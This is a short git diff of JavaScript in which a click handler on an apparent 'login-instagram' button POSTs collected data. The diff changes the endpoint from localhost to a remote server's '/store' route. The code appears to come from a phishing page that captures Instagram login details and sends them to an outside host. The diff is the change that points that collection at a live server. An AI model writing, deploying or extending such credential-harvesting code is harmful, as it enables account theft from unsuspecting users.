@@ -18,7 +18,7 @@ document.getElementById("login-instagram").addEventListener("click", async funct
             console.log("Envoi des données au serveur...");
 
             try {
-                const response = await fetch('http://localhost:3001/store', {
+                const response = await fetch('https://kadri-website.onrender.com:3001/store', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
